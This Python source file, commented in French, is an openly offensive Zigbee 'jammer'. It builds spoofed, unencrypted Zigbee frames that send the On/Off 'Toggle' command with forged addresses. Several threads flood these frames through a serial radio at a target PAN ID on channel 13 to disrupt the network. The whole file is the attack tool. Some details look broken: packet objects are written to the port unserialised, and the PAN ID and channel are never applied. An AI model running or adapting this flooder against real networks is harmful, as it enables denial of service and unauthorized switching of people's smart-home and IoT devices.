import serial
import time
import queue
import threading
import multiprocessing
import logging
import time
import signal
from scapy.all import *
from scapy.layers.dot15d4 import Dot15d4
from scapy.layers.zigbee import *

class ZigBeeJammer:
    def __init__(self, port_serie, pan_id, canal, vitesse_baud=115200, nombre_threads=None):
        self.port_serie = port_serie
        self.pan_id = pan_id
        self.canal = canal
        self.vitesse_baud = vitesse_baud
        self.nombre_threads = nombre_threads or multiprocessing.cpu_count()
        self.file_paquets = queue.Queue(maxsize=1000)
        self.compteur_paquets = multiprocessing.Value('i', 0)
        self.evenement_arret = threading.Event()
        self.verrou_serie = threading.Lock()
        self.CompteurSeq = 0  # Compteur de séquence pour les paquets

    def generer_paquet_malforme(self, 
                              dest_addr=0x6e14, 
                              src_addr=0x9ABC, 
                              profile=0x0104):
        """
        Crée un paquet Zigbee personnalisé avec correction de la trame Dot15d4
        
        Args:
            payload (bytes): Charge utile à envoyer
            dest_addr (int): Adresse de destination
            src_addr (int): Adresse source
            profile (int): Profil Zigbee
        
        Returns:
            Scapy Packet: Paquet Zigbee construit
        """
        try:
            zigbee_packet = (
                Dot15d4(
                    fcf_frametype=1,  # Data frame
                    fcf_security=0,   # No security
                    fcf_ackreq=0,     # No ACK requested
                    fcf_pending=0,    # No pending frame
                    fcf_destaddrmode=2,  # Short destination address
                    fcf_srcaddrmode=2,   # Short source address
                    fcf_framever=0,   # Compatibility with 2003 version
                    seqnum=self.CompteurSeq  # Random sequence number
                ) /
                ZigbeeNWK(
                    frametype=0,  # Data frame
                    destination=dest_addr,
                    source=src_addr,
                    radius=30  # Nombre de sauts maximum
                ) /
                ZigbeeAppDataPayload(
                    aps_frametype=0,  # Data frame
                    delivery_mode=0,  # Unicast
                    dst_endpoint=0x01,
                    src_endpoint=0x01,
                    cluster=0x0006,  # Cluster On/Off
                    profile=profile,
                    counter=random.randint(0, 255)  # Random APS counter
                ) /
                ZigbeeClusterLibrary(
                    zcl_frametype=0x01,
                    command_direction=0,
                    transaction_sequence=random.randint(0, 255),
                    command_identifier=0x02  # Commande Toggle
                )
            )

            if self.CompteurSeq == 255:
                self.CompteurSeq = 0
            else:
                self.CompteurSeq += 1
            return zigbee_packet

        except Exception as e:
            #logger.error(f"Erreur de création du paquet : {e}")
            raise

    def transmettre_paquets(self, connexion_serie):
        """
        Transmet des paquets extraits de la file vers le port série.
        """
        while not self.evenement_arret.is_set():
            try:
                paquet = self.file_paquets.get(timeout=0.1)
                if paquet is None:  # Marqueur d'arrêt
                    break
                with self.verrou_serie:
                    connexion_serie.write(paquet)
                    with self.compteur_paquets.get_lock():
                        self.compteur_paquets.value += 1
            except queue.Empty:
                continue
            except Exception as e:
                print(f"Erreur de transmission : {e}")
                break

    def flooder_reseau(self, duree=None):
        """
        Lance le flooding des paquets pour perturber le réseau ZigBee.

        Args:
            duree (float): Durée du flooding en secondes.
        """
        print(f"Perturbation du réseau ZigBee :")
        print(f"  PAN ID : 0x{self.pan_id:04X}")
        print(f"  Canal : {self.canal}")

        try:
            with serial.Serial(self.port_serie, self.vitesse_baud, timeout=1) as connexion_serie:
                threads = [
                    threading.Thread(target=self.transmettre_paquets, args=(connexion_serie,), daemon=True)
                    for _ in range(self.nombre_threads)
                ]
                for thread in threads:
                    thread.start()

                debut = time.time()
                while not self.evenement_arret.is_set():
                    if duree and (time.time() - debut > duree):
                        self.evenement_arret.set()
                        break  # Arrêt du flood

                    try:
                        paquet = self.generer_paquet_malforme()
                        if paquet:
                            self.file_paquets.put_nowait(paquet)
                    except queue.Full:
                        time.sleep(0.01)

                # Insérer des marqueurs d'arrêt dans la file pour terminer les threads
                for _ in threads:
                    self.file_paquets.put(None)

                # Attendre la fin des threads
                for thread in threads:
                    thread.join()
        except serial.SerialException as e:
            print(f"Erreur série : {e}")
        finally:
            self.evenement_arret.set()

    def afficher_statistiques(self):
        """
        Affiche les statistiques des paquets transmis.
        """
        print(f"\n Statistiques :")
        print(f"Total de paquets envoyés : {self.compteur_paquets.value}")

# Gestionnaire de signal pour afficher les statistiques
def gerer_sigint(signal_num, frame):
    print("\narrêt du programme.")
    jammer.evenement_arret.set()
    jammer.afficher_statistiques()
    exit(0)

# Exemple d'utilisation
if __name__ == "__main__":
    port = "/dev/ttyACM0"  
    pan_id = 0x1900  # PAN ID cible
    canal = 13  # Canal ZigBee

    jammer = ZigBeeJammer(
        port_serie=port,
        pan_id=pan_id,
        canal=canal
    )

    # Associer SIGINT (Ctrl+C) au gestionnaire
    signal.signal(signal.SIGINT, gerer_sigint)

    try:
        jammer.flooder_reseau(duree=30)  # Perturber pendant 30 secondes ou jusqu'à l'interruption
    except Exception as e:
        print(f"Erreur inattendue : {e}")
